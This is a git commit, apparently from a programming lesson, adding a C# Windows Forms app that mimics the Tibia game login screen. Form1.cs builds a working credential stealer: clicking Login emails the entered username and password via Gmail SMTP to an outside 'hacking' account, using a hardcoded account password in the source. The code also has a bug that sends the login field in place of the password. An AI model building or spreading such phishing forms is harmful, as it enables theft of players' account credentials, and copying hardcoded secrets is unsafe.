908f32d10af42cd0d0a8cd747d18b92d5cc03c3d
Andrej Hosna <hosna.andrej@gmail.com>
2021-06-06 22:47:13 +0100

    Import from lesson 13

---
+++ Tibia/Form1.Designer.cs
@@ -0,0 +1,95 @@
+﻿namespace Tibia
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.txtLogin = new System.Windows.Forms.TextBox();
+            this.txtPass = new System.Windows.Forms.TextBox();
+            this.btnSend = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // txtLogin
+            // 
+            this.txtLogin.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
+            this.txtLogin.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.txtLogin.Location = new System.Drawing.Point(368, 142);
+            this.txtLogin.Margin = new System.Windows.Forms.Padding(2);
+            this.txtLogin.Name = "txtLogin";
+            this.txtLogin.Size = new System.Drawing.Size(84, 13);
+            this.txtLogin.TabIndex = 0;
+            // 
+            // txtPass
+            // 
+            this.txtPass.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
+            this.txtPass.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.txtPass.Location = new System.Drawing.Point(368, 168);
+            this.txtPass.Margin = new System.Windows.Forms.Padding(2);
+            this.txtPass.Name = "txtPass";
+            this.txtPass.PasswordChar = '*';
+            this.txtPass.Size = new System.Drawing.Size(84, 13);
+            this.txtPass.TabIndex = 1;
+            // 
+            // btnSend
+            // 
+            this.btnSend.BackColor = System.Drawing.Color.DimGray;
+            this.btnSend.Location = new System.Drawing.Point(368, 244);
+            this.btnSend.Margin = new System.Windows.Forms.Padding(2);
+            this.btnSend.Name = "btnSend";
+            this.btnSend.Size = new System.Drawing.Size(84, 24);
+            this.btnSend.TabIndex = 2;
+            this.btnSend.Text = "Login";
+            this.btnSend.UseVisualStyleBackColor = false;
+            this.btnSend.Click += new System.EventHandler(this.btnSend_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = global::Tibia.Properties.Resources.TibiaScreen;
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ClientSize = new System.Drawing.Size(687, 550);
+            this.Controls.Add(this.btnSend);
+            this.Controls.Add(this.txtPass);
+            this.Controls.Add(this.txtLogin);
+            this.DoubleBuffered = true;
+            this.Margin = new System.Windows.Forms.Padding(2);
+            this.Name = "Form1";
+            this.Text = "Tibia";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox txtLogin;
+        private System.Windows.Forms.TextBox txtPass;
+        private System.Windows.Forms.Button btnSend;
+    }
+}
+
---
+++ Tibia/Form1.cs
@@ -0,0 +1,50 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Net;
+using System.Net.Mail;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Tibia
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void btnSend_Click(object sender, EventArgs e)
+        {
+            MailMessage mail = new MailMessage("gigancihacking@gmail.com", "gigancihacking@gmail.com");
+            /* First create object that implements MailMessage class.
+             * Pass the name of the sender and recipient to the constructor (we will send the password to ourselves for security) */
+
+            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
+            /* Create SMTP client.
+            SMTP (Simple Mail Transfer Protocol) – communication protocol that describes
+            method of transfering emails in the Internet
+            SMTP is simple, text protocol, which determine
+            at least one recipient (in majority of cases it is verified if they exists)
+            and then transfer message content */
+            
+            client.Credentials = new NetworkCredential("gigancihacking@gmail.com", "giganci123");
+            //login and password is required to send email form our gmail account
+
+            client.EnableSsl = true;
+            //enable SSL, so the email is encrypted, tell students about SSL
+
+            mail.Subject = "Tibia";
+            mail.Body = "Login: " + txtLogin.Text + " Password: " +txtLogin.Text;
+            //add email title and content
+
+            client.Send(mail);
+            //send email
+        }
+    }
+}
